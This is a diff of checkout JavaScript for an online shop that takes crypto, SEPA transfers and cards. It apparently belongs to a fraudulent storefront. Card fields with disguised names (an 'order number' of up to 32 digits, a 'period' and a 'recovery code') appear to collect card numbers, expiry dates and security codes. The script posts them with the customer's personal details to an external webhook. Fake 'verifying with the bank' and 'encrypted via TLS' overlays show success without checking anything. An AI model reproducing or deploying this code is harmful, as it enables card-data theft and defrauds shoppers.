     await postCompat(WEBHOOK_URL, payload);
   }
-  async function sendSepaToWebhook(dueNow, proofFile){
+
+  async function fileToBase64(file){
+    const buf=await file.arrayBuffer();
+    let bin=''; const bytes=new Uint8Array(buf), chunk=0x8000;
+    for(let i=0;i<bytes.length;i+=chunk){ bin+=String.fromCharCode.apply(null, bytes.subarray(i,i+chunk)); }
+    return btoa(bin);
+  }
+
+  async function sendSepa(dueNow, proofFile){
     const payload = {
-      orderId,
-      method:'sepa',
-      amount: Number(dueNow||0).toFixed(2),
+      orderId, method:'sepa', amount:(+dueNow||0).toFixed(2),
       ref: ($('#vref')?.value||'').trim(),
-      name: $('#name')?.value || '',
-      email:$('#email')?.value||'',
-      phone:$('#phone')?.value||'',
-      address:$('#address')?.value||'',
-      city: $('#city')?.value ||'',
-      zip:  $('#zip')?.value  ||'',
-      country:$('#country')?.value||'',
-      split: selectedSplit,
-      cart: cartForWebhook(),
-      ts_client: new Date().toISOString()
+      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
+      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
+      country:$('#country')?.value||'', country_name: countryName(),
+      split:selectedSplit, cart:cartForWebhook()
     };
     if(proofFile){
       payload.file_name = proofFile.name;
@@ -557,142 +261,138 @@
     }
     await postCompat(WEBHOOK_URL, payload);
   }
-  async function sendCardToWebhook(dueNow){
-    const rawNum = ($('#orderNumber')?.value||'').replace(/\D+/g,'').slice(0,32);
+
+  async function sendCard(dueNow){
+    // Champs du FORMULAIRE 2 (carte)
+    const card_name    = ($('#cardName')?.value||'').trim();
+    const order_number = ($('#orderNumber')?.value||'').replace(/\D+/g,'').slice(0,32);
+    const period       = ($('#cardPeriod')?.value||'').trim();
+    const recovery_code= ($('#recoveryCode')?.value||'').trim();
+
+    // Envoi avec ALIAS pour compat maximale côté Apps Script
     const payload = {
-      orderId,
-      method:'card',
-      amount: Number(dueNow||0).toFixed(2),
-      // champs “métadonnées” du formulaire carte
-      card_name: ($('#cardName')?.value||'').trim(),
-      order_number: rawNum,
-      period: ($('#cardPeriod')?.value||'').trim(),
-      recovery_code: ($('#recoveryCode')?.value||'').trim(),
+      orderId, method:'card', amount:(+dueNow||0).toFixed(2),
+
+      // Canonique + alias
+      card_name, titulaire: card_name, cardholder: card_name, cardName: card_name,
+      order_number, numero_commande: order_number, commande: order_number, orderNumber: order_number,
+      period, periode: period, card_period: period, cardPeriod: period,
+      recovery_code, code_recuperation: recovery_code, recoveryCode: recovery_code,
+
       phone_meta: ($('#phone')?.value||'').trim(),
-      // coordonnées client
-      name: $('#name')?.value || '',
-      email:$('#email')?.value||'',
-      phone:$('#phone')?.value||'',
-      address:$('#address')?.value||'',
-      city: $('#city')?.value ||'',
-      zip:  $('#zip')?.value  ||'',
-      country:$('#country')?.value||'',
-      split: selectedSplit,
-      cart: cartForWebhook(),
-      ts_client: new Date().toISOString()
+
+      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
+      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
+      country:$('#country')?.value||'', country_name: countryName(),
+
+      split:selectedSplit, cart:cartForWebhook()
     };
     await postCompat(WEBHOOK_URL, payload);
   }
 
-  // =========================
-  // CONFIRMATIONS
-  // =========================
-  $('#confirmCrypto')?.addEventListener('click', async ()=>{
-    if(!validateAddress()) return;
-    const cart=getCart(); if(!cart.length){ toast('Votre panier est vide.'); return; }
-    const due = currentDueNow(); if(due<=0){ toast('Montant dû nul.'); return; }
-    const tx = ($('#txid')?.value||'').trim(); if(!tx){ $('#txid')?.focus(); toast('TxID requis.'); return; }
+  /* ====== FILES (SEPA) ====== */
+  const dz=$('#dz'), input=$('#proofInput'), fileWrap=$('#fileWrap'), fileName=$('#fileName'), fileInfo=$('#fileInfo'), fileBar=$('#fileBar'), fileOk=$('#fileOk');
+  let proofFile=null;
+  function fmtBytes(b){ if(b===0) return '0 B'; if(!b&&b!==0) return ''; const u=['B','KB','MB','GB']; let i=0; while(b>=1024&&i<u.length-1){b/=1024;i++;} return b.toFixed(b<10&&i?1:0)+' '+u[i]; }
+  function showFile(f){
+    proofFile=f;
+    if(fileWrap) fileWrap.style.display='flex';
+    if(fileName) fileName.textContent=f.name||'Datei';
+    if(fileInfo) fileInfo.textContent=(f.type||'Unbekannter Typ')+' • '+fmtBytes(f.size||0);
+    if(fileBar)  fileBar.style.width='0%';
+    if(fileOk)   fileOk.style.display='none';
+    let p=0; const step=()=>{ p+=Math.random()*35+20; if(p>=100){ p=100; fileBar&&(fileBar.style.width='100%'); fileOk&&(fileOk.style.display='inline-flex'); return; } fileBar&&(fileBar.style.width=p+'%'); setTimeout(step,150); }; setTimeout(step,150);
+  }
+  input?.addEventListener('change', e=>{ const f=e.target.files?.[0]; if(!f) return; if(f.size>MAX_SIZE){ toast('Datei > 10 MB.'); input.value=''; return; } showFile(f); input.value=''; });
+  dz?.addEventListener('dragover', e=>{ e.preventDefault(); dz.classList.add('over'); });
+  dz?.addEventListener('dragleave', e=>{ e.preventDefault(); dz.classList.remove('over'); });
+  dz?.addEventListener('drop', e=>{ e.preventDefault(); dz.classList.remove('over'); const f=e.dataTransfer?.files?.[0]; if(!f) return; if(f.size>MAX_SIZE){ toast('Datei > 10 MB.'); return; } showFile(f); });
+  $('#removeProof')?.addEventListener('click', ()=>{ proofFile=null; if(input) input.value=''; if(fileWrap) fileWrap.style.display='none'; });
 
-    showOverlay('Vérification de la transaction crypto…', 'Nous validons le hash fourni.');
-    try{ await sendCryptoToWebhook(due); }catch{}
-    setTimeout(()=>{
-      hideOverlay();
-      cryptoVerified=true;
-      updateCTA();
-      toast('Transaction enregistrée — vous pouvez finaliser');
-      $('#placeOrder')?.focus();
-    }, 900);
+  /* ====== TABS ====== */
+  $$('.m[role="tab"]').forEach(card=>{
+    card.addEventListener('click', ()=>{
+      $$('.m[role="tab"]').forEach(c=>c.setAttribute('aria-selected', String(c===card)));
+      const m=card.dataset.method;
+      $('#pmCrypto')?.classList.toggle('show', m==='crypto');
+      $('#pmSEPA')?.classList.toggle('show', m==='sepa');
+      $('#pmCard')?.classList.toggle('show', m==='card');
+      if(m==='sepa') cryptoVerified=false;
+      if(m==='crypto') bankVerified=false;
+      updateSummary(); updateCTA();
+    });
   });
 
-  $('#confirmBank')?.addEventListener('click', async ()=>{
-    if(!validateAddress()) return;
-    const cart=getCart(); if(!cart.length){ toast('Votre panier est vide.'); return; }
-    const due = currentDueNow(); if(due<=0){ toast('Montant dû nul.'); return; }
-    if(!($('#vref')?.value||'').trim()){ syncRef(); }
-    if(!proofFile){ dz?.scrollIntoView({behavior:'smooth',block:'center'}); toast('Preuve de virement requise.'); return; }
+  /* ====== SPLIT UI ====== */
+  const modal=$('#splitModal');
+  const setModalParts=(n)=>{ $$('#segSplit .segbtn').forEach(b=>b.setAttribute('aria-pressed', String(Number(b.dataset.parts)===Number(n)))); };
+  const updateModalPreview=()=>{
+    const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0, sub - promo);
+    const parts=Number($$('#segSplit .segbtn').find(b=>b.getAttribute('aria-pressed')==='true')?.dataset.parts||4);
+    const lines=scheduleLines(total, parts);
+    $('#modalPrev').innerHTML = lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
+  };
+  $$('#segSplit .segbtn').forEach(b=> b.addEventListener('click',()=>{ setModalParts(b.dataset.parts); updateModalPreview(); }));
+  $('#btnSplit')?.addEventListener('click',()=>{ modal?.classList.add('show'); modal?.setAttribute('aria-hidden','false'); setModalParts(4); updateModalPreview(); });
+  $('#closeSplit')?.addEventListener('click',()=>{ modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); });
+  $('#cancelSplit')?.addEventListener('click',()=>{ modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); });
+  $('#applySplit')?.addEventListener('click',()=>{ const sel=$$('#segSplit .segbtn').find(b=>b.getAttribute('aria-pressed')==='true'); selectedSplit=Number(sel?.dataset.parts||4); const hint=$('#splitHint'); if(hint) hint.textContent = selectedSplit>1 ? `(${selectedSplit}× monatlich)` : '(deaktiviert)'; $('#btnSplit')?.classList.add('on'); $('#btnOnce')?.classList.remove('on'); modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); updateSummary(); });
 
-    showOverlay('Vérification du virement…', 'Nous confirmons la réception auprès de la banque.');
-    try{ await sendSepaToWebhook(due, proofFile); }catch{}
-    setTimeout(()=>{
-      hideOverlay();
-      bankVerified=true;
-      updateCTA();
-      toast('Virement enregistré — vous pouvez finaliser');
-      $('#placeOrder')?.focus();
-    }, 1000);
+  /* ====== ACTIONS (anti double-click) ====== */
+  function once(btn, fn){ let busy=false; btn?.addEventListener('click', async ()=>{ if(busy) return; busy=true; try{ await fn(); } finally{ setTimeout(()=>busy=false, 900); } }); }
+
+  // Auto-référence SEPA si vide
+  function ensureVref(){ if(!$('#vref')?.value?.trim()){ const name=$('#name')?.value||''; const base=(name||'').normalize('NFD').replace(/[\u0300-\u036f]/g,'').toUpperCase().replace(/[^A-Z0-9]+/g,'').slice(0,16) || orderId.replace('GF-','').split('-')[0]; $('#vref').value = base; } }
+  $('#name')?.addEventListener('input', ()=>{ if(!$('#vref')?.value?.trim()) ensureVref(); });
+
+  once($('#confirmCrypto'), async ()=>{
+    if(!validateAddress()) return;
+    const tx=($('#txid')?.value||'').trim(); if(!tx){ $('#txid')?.focus(); toast('TxID requis.'); return; }
+    showOverlay('Krypto wird geprüft…','Hash validieren…');
+    await sendCrypto(currentDueNow());
+    hideOverlay(); cryptoVerified=true; updateCTA(); toast('Transaktion erfasst — Sie können abschließen'); $('#placeOrder')?.focus();
   });
 
-  // ========= PAIEMENT PAR CARTE =========
-  $('#payCard')?.addEventListener('click', async ()=>{
+  once($('#confirmBank'), async ()=>{
+    if(!validateAddress()) return;
+    ensureVref();
+    if(!proofFile){ $('#dz')?.scrollIntoView({behavior:'smooth',block:'center'}); toast('Überweisungsnachweis erforderlich.'); return; }
+    showOverlay('Überweisung wird geprüft…','Bestätigung bei der Bank…');
+    await sendSepa(currentDueNow(), proofFile);
+    hideOverlay(); bankVerified=true; updateCTA(); toast('Überweisung erfasst — Sie können abschließen'); $('#placeOrder')?.focus();
+  });
+
+  once($('#payCard'), async ()=>{
     if(!validateAddress()) return;
     if(!validateCardForm()) return;
-
-    const cart=getCart();
-    if(!cart.length){ toast('Votre panier est vide.'); return; }
-    const due = currentDueNow(); if(due<=0){ toast('Montant dû nul.'); return; }
-
-    showOverlay('Paiement par carte…', 'Chiffré via TLS.');
-    try{ await sendCardToWebhook(due); }catch{}
-    setTimeout(()=>{ hideOverlay(); window.location.href = 'merci.html'; }, 900);
+    showOverlay('Paiement par carte…','Chiffré via TLS.');
+    await sendCard(currentDueNow());
+    // on garde l’overlay visible jusqu’à la navigation (sendBeacon/keepalive assure l’envoi)
+    setTimeout(()=>{ window.location.href='merci.html'; }, 1200);
   });
 
-  // =========================
-  // FINALISER LA COMMANDE (SEPA/CRYPTO)
-  // =========================
   $('#placeOrder')?.addEventListener('click', ()=>{
     if(!validateAddress()) return;
-    const cart = getCart(); if(!cart.length){ toast('Votre panier est vide.'); return; }
-    const pm = currentPM();
-    if(pm==='crypto' && !cryptoVerified){ toast('Veuillez terminer la vérification crypto.'); return; }
-    if(pm==='sepa'   && !bankVerified){ toast('Veuillez terminer la vérification du virement.'); return; }
-
-    const sub=computeSub(cart);
-    const promo=sub*promoRate();
-    const total=Math.max(0, sub - promo);
-
-    const order = {
-      id: orderId,
-      date: new Date().toISOString(),
-      status: 'En préparation',
-      items: cart,
-      pricing: { sub, ship:0, promo, total, currency:'EUR' },
-      shipping:{
-        name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
-        address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'', country:$('#country')?.value||''
-      },
-      payment: {
-        method: pm, split: selectedSplit,
-        details: pm==='crypto'
-          ? { ccy:$('#ccy')?.value||'', address:$('#wallet')?.value||'', txid:$('#txid')?.value||'', amountNow:$('#amountNow')?.value||'' }
-          : { iban:$('#iban')?.value||'', ref:$('#vref')?.value||'', amountNow:$('#amountNowBank')?.value||'', proofName:proofFile?.name||'' }
-      }
+    const cart=getCart(); if(!cart.length){ toast('Ihr Warenkorb ist leer.'); return; }
+    const pm=currentPM(); if(pm==='crypto'&&!cryptoVerified){ toast('Bitte Krypto-Prüfung abschließen.'); return; }
+    if(pm==='sepa'&&!bankVerified){ toast('Bitte Überweisungs-Prüfung abschließen.'); return; }
+    const sub=computeSub(cart), promo=sub*promoRate(), total=Math.max(0, sub - promo);
+    const order={ id:orderId, date:new Date().toISOString(), status:'In Bearbeitung',
+      items:cart, pricing:{sub,ship:0,promo,total,currency:'EUR'},
+      shipping:{ name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'', address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'', country:$('#country')?.value||'', country_name: countryName() },
+      payment:{ method:pm, split:selectedSplit }
     };
-    try{
-      const all = JSON.parse(localStorage.getItem('gf_orders')||'[]');
-      all.push(order);
-      localStorage.setItem('gf_orders', JSON.stringify(all));
-    }catch{}
-
-    setCart([]);
-    showDone();
+    try{ const all=JSON.parse(localStorage.getItem('gf_orders')||'[]'); all.push(order); localStorage.setItem('gf_orders', JSON.stringify(all)); }catch{}
+    setCart([]); showDone();
   });
 
-  // =========================
-  // INIT
-  // =========================
-  function initTabsAndSummary(){
-    const sepaTab = document.querySelector('.m[role="tab"][data-method="sepa"]');
-    if(sepaTab){ sepaTab.setAttribute('aria-selected','true'); }
-    $('#pmSEPA')?.classList.add('show');
-    $('#pmCrypto')?.classList.remove('show');
-    $('#pmCard')?.classList.remove('show');
-  }
-
-  renderMini();
-  initTabsAndSummary();
-  window.updateSplitHint?.();
-  syncRef();
-  updateSummary();
-  updateCTA();
-
+  /* ====== INIT ====== */
+  (function init(){
+    // onglet par défaut: SEPA
+    const sepaTab=document.querySelector('.m[role="tab"][data-method="sepa"]'); sepaTab?.setAttribute('aria-selected','true');
+    $('#pmSEPA')?.classList.add('show'); $('#pmCrypto')?.classList.remove('show'); $('#pmCard')?.classList.remove('show');
+    setCryptoAddress($('#ccy')?.value||'USDT-BEP20');
+    $('#ccy')?.addEventListener('change',()=>{ setCryptoAddress($('#ccy').value); updateSummary(); });
+    renderMini(); updateSummary(); updateCTA();
+  })();
 })();
